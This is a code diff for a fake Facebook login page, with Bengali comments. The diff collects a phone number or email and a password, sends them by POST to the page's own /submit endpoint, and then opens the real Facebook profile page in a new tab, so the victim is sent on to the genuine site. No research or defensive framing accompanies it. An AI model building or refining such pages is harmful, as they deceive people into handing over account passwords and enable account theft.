@@ -3,77 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Log in</title>
+    <title>Facbook Log in</title>
     <style>
-        @media only screen and (max-width: 400px) {
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f7f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
 
-        .container{ width: 100% !important;}
-    }
+        .form-container {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        /* সুন্দর সাবমিট বাটন স্টাইল (No standard outline border) */
+        .submit-btn {
+            width: 100%;
+            background-color: #0091cf; /* সুন্দর সবুজ কালার */
+            color: white;
+            padding: 12px;
+            border: none; /* কোনো বর্ডার থাকবে না */
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #0185be; /* মাউস নিলে কালার গাঢ় হবে */
+        }
     </style>
 </head>
-<body style="margin: 0px; padding: 0px;background-color: #f2f2f2;font-family: Verdana, Geneva, Tahoma, sans-serif;overflow: hidden;">
-<div id="fb-root"></div>
+<body>
 
-</div>
-    <table class="container" border="1" cellpadding="0" cellspacing="0" width="400" height="250px" style="margin: 100px auto; font-family: Verdana, Geneva, Tahoma, sans-serif; background-color: #ffffff; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); overflow: hidden;">
-        <tr>
-            <td style="text-align: center;padding: 40px 20px;">
-                <div style="background-color: #00bbff; display: inline-block;width: 60px; height: 60px; border-radius: 50%; line-height: 60px; font-weight: bold; font-size: 50px;color: #fff; font-family: Arial, Helvetica, sans-serif;">f</div>
-            </td>
-        </tr>
-        <tr style="text-align: center;">
-            <td>
-            <div style="background-color: #fff; display: inline-block; color: #00bbff;padding: 8px 90px; font-weight: 600; border-radius: 8px; margin-bottom: 30px;">
-            Log in Your Facebook Acount
+    <div class="form-container">
+        <div class="f-logo">
+            <img src="f_.jpg" alt="logo" style="width: 35px;">
+        </div>
+        <div class="text">
+            <h5 style="color: #0185be; font-size: 17px; margin-top: 10px;">Log in Your Facebook Acount</h5>
+        </div>
+        <!-- target="_blank" দেওয়ার ফলে সাবমিট বাটনে ক্লিক করলে নতুন লিংকে ডাটা যাবে ও নতুন ট্যাব খুলবে -->
+        <form action="/submit" method="POST" id="contactForm" target="_blank">
+            <div class="input-group">
+                <label for="user_name">Phone number</label>
+                <input type="text" id="user_name" name="user_name" placeholder="Phone number or Email address" required>
             </div>
-            </td>
 
+            <div class="input-group">
+                <label for="user_message">Password</label>
+                <input type="text" id="user_message" name="user_message" placeholder="Password" required>
+            </div>
 
+            <button type="submit" class="submit-btn" onclick="openRedirectLink()">Submit</button>
+        </form>
+    </div>
 
-            <tr>
-                <td style="padding: 10px; text-align: center;">
+    <script>
+        function openRedirectLink() {
+            // ফর্ম ফিল্ড ফাঁকা না থাকলে নতুন লিংক ওপেন করবে
+            var name = document.getElementById('user_name').value;
+            var message = document.getElementById('user_message').value;
 
-
-                    <form action="/submit" method="POST">
-                        <input type="text" id="user_name" name="user_name" placeholder="Phone number or Email address"style="width: 250px; height: 30px;padding-left: 10px;border: 2px solid rgb(66, 192, 255); border-radius: 8px; font-family: Arial, Helvetica, sans-serif;">
-
-                        
-
-                </td>
-            </tr>
-        </tr>
-        <tr>
-            <td style="text-align: center;padding: 10px;">
-
-                <input style="width: 250px; height: 30px;padding-left: 10px; border: 2px solid rgb(66, 192, 255); border-radius: 8px; font-family: Arial, Helvetica, sans-serif;" type="password" name="user_message" id="user_message" placeholder="Password">
-            </td>
-        </tr>
-        <tr>
-            <td style="text-align: center;padding: 10px;padding-bottom: 50px;">
-                <div style="background-color: #00bbff; display: inline-block; color: #fff;padding: 10px 50px; font-weight: 600; border-radius: 20px;font-family: Arial, Helvetica, sans-serif;">
-                    
-
-                     <button type="submit">Submit</button>
-    </form>
-
-                </div>
-
-               
-            </td>
-        </tr>
-    </table>
-</div>
-
-
-
-
-
-
-
-
-
-
-
+            if (name !== "" && message !== "") {
+                // এখানে আপনার কাঙ্ক্ষিত নতুন লিংকটি বসিয়ে দিন (যেমন: https://google.com)
+                window.open("https://facebook.com/profile.php", "_blank");
+            }
+        }
+    </script>
 
 </body>
 </html>
